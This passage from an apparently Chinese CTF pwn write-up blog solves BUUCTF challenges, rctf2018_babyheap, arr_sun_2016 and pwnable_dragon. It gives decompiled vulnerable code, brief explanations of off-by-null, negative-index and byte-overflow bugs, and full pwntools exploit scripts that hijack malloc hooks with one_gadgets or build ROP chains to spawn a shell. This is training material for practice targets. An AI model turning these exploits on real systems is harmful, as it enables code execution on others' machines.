book:"</span>, desc)</span><br><span class="line">    r.sendlineafter(<span class="string">'How many book you want to take?'</span>, <span class="built_in">str</span>(many))</span><br><span class="line"></span><br><span class="line">dbgg()</span><br><span class="line">add(<span class="string">'a'</span> * <span class="number">8</span>, <span class="string">'b'</span> * <span class="number">8</span>, <span class="number">1</span>)</span><br><span class="line">add(<span class="string">'a'</span> * <span class="number">8</span>, <span class="string">'b'</span> * <span class="number">8</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">p1 = p64(<span class="number">0</span>) * <span class="number">9</span> + p64(puts_got)</span><br><span class="line">edit(<span class="number">0</span>, p1, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">puts_addr = u64(r.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'puts_addr = '</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF('./2.23/libc-2.23.so')</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">li(<span class="string">'free_hook = '</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line"><span class="comment">#one = [0x45226, 0x4527a, 0xf03a4, 0xf1247]</span></span><br><span class="line">one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">one_gadget = one[<span class="number">1</span>] + libc_base</span><br><span class="line"></span><br><span class="line">p2 = p64(<span class="number">0</span>) * <span class="number">9</span> + p64(free_hook)</span><br><span class="line">edit2(<span class="number">0</span>, p2, p64(one_gadget), <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="rctf2018-babyheap"><a href="#rctf2018-babyheap" class="headerlink" title="rctf2018_babyheap"></a>rctf2018_babyheap</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *<span class="title function_">add</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> len; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( add_counts &gt; <span class="number">0x20</span>u )</span><br><span class="line">    my_error(<span class="string">"too many chunk"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"please input chunk size: "</span>);</span><br><span class="line">  size = read_input();</span><br><span class="line">  len = size;</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0</span> || size &gt; <span class="number">0x100</span>LL )</span><br><span class="line">    my_error(<span class="string">"invalid size"</span>);</span><br><span class="line">  ptr = <span class="built_in">calloc</span>(size, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">    my_error(<span class="string">"memory error"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input chunk content: "</span>);</span><br><span class="line">  sub_BC8((__int64)ptr, len);                   <span class="comment">// vuln</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt;= <span class="number">0x1F</span> &amp;&amp; heap_ptr[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">32</span> )</span><br><span class="line">    my_error(<span class="string">"too many chunk"</span>);</span><br><span class="line">  heap_ptr[i] = (__int64)ptr;</span><br><span class="line">  result = &amp;add_counts;</span><br><span class="line">  ++add_counts;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>Off-by-null，但是这里用的calloc来申请的，calloc并不会拿tcache里面的东西，所以只能借助fastbin来进行overlapping操作</p>
<p>填满tcache即可进行正常的off-by-null堆重叠</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./babyheap'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">25983</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'choice: '</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'please input chunk size: '</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendlineafter(<span class="string">'input chunk content: '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'please input chunk index: '</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'please input chunk index: '</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">dbgg()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>, <span class="string">'a'</span> * <span class="number">8</span>)  <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'b'</span> * <span class="number">8</span>)  <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0xf8</span>, <span class="string">'c'</span> * <span class="number">8</span>)  <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0xf8</span>, <span class="string">'a'</span> * <span class="number">8</span>) <span class="comment">#3 - 10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x68</span>, <span class="string">'a'</span> * <span class="number">8</span>)  <span class="comment">#11-18</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">    delete(i)   <span class="comment">#3- 9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>, <span class="number">18</span>):</span><br><span class="line">    delete(i)   <span class="comment">#11- 17</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b'a'</span> * <span class="number">0x60</span> + p64(<span class="number">0x170</span>)) <span class="comment">#0</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>, <span class="string">'a'</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(r.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) - <span class="number">96</span> - <span class="number">0x10</span></span><br><span class="line">li(<span class="string">'malloc_hook = '</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./2.27/libc-2.27.so'</span>)</span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line">one_gadget = one[<span class="number">1</span>] + libc_base</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'a'</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">18</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>, p64(malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'a'</span> * <span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'a'</span> * <span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b'\x00'</span> * <span class="number">0x13</span> + p64(one_gadget))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(menu, <span class="string">'1'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'please input chunk size: '</span>, <span class="string">'20'</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="arr-sun-2016"><a href="#arr-sun-2016" class="headerlink" title="arr_sun_2016"></a>arr_sun_2016</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_8048592</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> index; <span class="comment">// [esp+8h] [ebp-40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+10h] [ebp-38h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+14h] [ebp-34h]</span></span><br><span class="line">  <span class="type">int</span> v5[<span class="number">11</span>]; <span class="comment">// [esp+18h] [ebp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"enter index"</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;index);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"enter value"</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">    <span class="keyword">if</span> ( index &gt; <span class="number">9</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    v5[index] = v2;</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"behold, your creation!"</span>);</span><br><span class="line">  result = fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">9</span>; ++j )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d "</span>, v5[j]);</span><br><span class="line">    result = fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>只能通过负数来越界，注意的地方是这里，v5[index] = v2;，这里的index会*4</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, [ebp+index]</span><br><span class="line">mov     edx, [ebp+value]</span><br><span class="line">mov     [ebp+eax*4+var_30], edx</span><br><span class="line">add     [ebp+var_34], 1</span><br></pre></td></tr></tbody></table></figure>

<p>是-2147483648的时候是-0x80000000，在__isoc99_scanf(“%d”, &amp;index);这里得到的是低位的0，所以可以借助这个溢出来覆盖ret，直接构造rop即可</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./arr_sun_2016'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">25088</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'What should I call you? \n'</span>, <span class="string">'a'</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">'enter index\n'</span>, <span class="string">'0'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'enter value\n'</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">dbgg()</span><br><span class="line"></span><br><span class="line">oob = -<span class="number">2147483648</span></span><br><span class="line"><span class="comment">#oob = 0x80000000</span></span><br><span class="line">bd = <span class="number">0x804857B</span></span><br><span class="line">scanf_plt = <span class="number">0x80485E3</span></span><br><span class="line">r.sendlineafter(<span class="string">'enter index\n'</span>, <span class="built_in">str</span>(oob + <span class="number">0xd</span>))</span><br><span class="line">r.sendlineafter(<span class="string">'enter value\n'</span>, <span class="built_in">str</span>(<span class="number">0x08048460</span>))</span><br><span class="line">r.sendlineafter(<span class="string">'enter index\n'</span>, <span class="built_in">str</span>(oob + <span class="number">0xe</span>))</span><br><span class="line">r.sendlineafter(<span class="string">'enter value\n'</span>, <span class="built_in">str</span>(<span class="number">0x80487BA</span>))</span><br><span class="line">r.sendlineafter(<span class="string">'enter index\n'</span>, <span class="built_in">str</span>(oob + <span class="number">0xf</span>))</span><br><span class="line">r.sendlineafter(<span class="string">'enter value\n'</span>, <span class="built_in">str</span>(<span class="number">0x0804882F</span>))</span><br><span class="line">r.sendlineafter(<span class="string">'enter index\n'</span>, <span class="built_in">str</span>(oob + <span class="number">0x10</span>))</span><br><span class="line">r.sendlineafter(<span class="string">'enter value\n'</span>, <span class="built_in">str</span>(<span class="number">0x08049B30</span>))</span><br><span class="line">r.sendlineafter(<span class="string">'enter index\n'</span>, <span class="built_in">str</span>(oob + <span class="number">0x11</span>))</span><br><span class="line">r.sendlineafter(<span class="string">'enter value\n'</span>, <span class="built_in">str</span>(<span class="number">0x0804857B</span>))</span><br><span class="line">r.sendlineafter(<span class="string">'enter index\n'</span>, <span class="built_in">str</span>(oob + <span class="number">0x12</span>))</span><br><span class="line">r.sendlineafter(<span class="string">'enter value\n'</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">r.sendlineafter(<span class="string">'enter index\n'</span>, <span class="built_in">str</span>(oob + <span class="number">0x13</span>))</span><br><span class="line">r.sendlineafter(<span class="string">'enter value\n'</span>, <span class="built_in">str</span>(<span class="number">0x08049B30</span>))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="pwnable-dragon"><a href="#pwnable-dragon" class="headerlink" title="pwnable_dragon"></a>pwnable_dragon</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">PriestAttack</span><span class="params">(<span class="type">int</span> a1, _DWORD *ptr)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> Choice; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  {</span><br><span class="line">    ((<span class="type">void</span> (__cdecl *)(_DWORD *))*ptr)(ptr);</span><br><span class="line">    (*(<span class="type">void</span> (__cdecl **)(<span class="type">int</span>))(a1 + <span class="number">12</span>))(a1);</span><br><span class="line">    Choice = GetChoice();</span><br><span class="line">    <span class="keyword">switch</span> ( Choice )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Clarity! Your Mana Has Been Refreshed"</span>);</span><br><span class="line">        *(_DWORD *)(a1 + <span class="number">8</span>) = <span class="number">50</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"But The Dragon Deals %d Damage To You!\n"</span>, ptr[<span class="number">3</span>]);</span><br><span class="line">        *(_DWORD *)(a1 + <span class="number">4</span>) -= ptr[<span class="number">3</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"And The Dragon Heals %d HP!\n"</span>, *((<span class="type">char</span> *)ptr + <span class="number">9</span>));</span><br><span class="line">        *((_BYTE *)ptr + <span class="number">8</span>) += *((_BYTE *)ptr + <span class="number">9</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">8</span>) &gt; <span class="number">24</span> )</span><br><span class="line">        {</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"HolyShield! You Are Temporarily Invincible..."</span>);</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"But The Dragon Heals %d HP!\n"</span>, *((<span class="type">char</span> *)ptr + <span class="number">9</span>));</span><br><span class="line">          *((_BYTE *)ptr + <span class="number">8</span>) += *((_BYTE *)ptr + <span class="number">9</span>);</span><br><span class="line">          *(_DWORD *)(a1 + <span class="number">8</span>) -= <span class="number">25</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">8</span>) &gt; <span class="number">9</span> )</span><br><span class="line">        {</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Holy Bolt Deals %d Damage To The Dragon!\n"</span>, <span class="number">20</span>);</span><br><span class="line">          *((_BYTE *)ptr + <span class="number">8</span>) -= <span class="number">20</span>;</span><br><span class="line">          *(_DWORD *)(a1 + <span class="number">8</span>) -= <span class="number">10</span>;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"But The Dragon Deals %d Damage To You!\n"</span>, ptr[<span class="number">3</span>]);</span><br><span class="line">          *(_DWORD *)(a1 + <span class="number">4</span>) -= ptr[<span class="number">3</span>];</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"And The Dragon Heals %d HP!\n"</span>, *((<span class="type">char</span> *)ptr + <span class="number">9</span>));</span><br><span class="line">          *((_BYTE *)ptr + <span class="number">8</span>) += *((_BYTE *)ptr + <span class="number">9</span>);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Not Enough MP!"</span>);</span><br><span class="line">LABEL_11:</span><br><span class="line">    <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">4</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">while</span> ( *((<span class="type">char</span> *)ptr + <span class="number">8</span>) &gt; <span class="number">0</span> );</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>dragon的血是byte类型，和char类型溢出一个道理，128就变成负的，<code>while ( *((char *)ptr + 8) &gt; 0 );</code>当dragon的血小于0，则<code>free(dragon)</code>，所以只需要想办法把dragon的血一直加，加到超过128就行了</p>
<p>一开始血太少了，所以会失败，第二次血会多一点，这样了hero的血完全可以支撑到dragon的血加超过128</p>
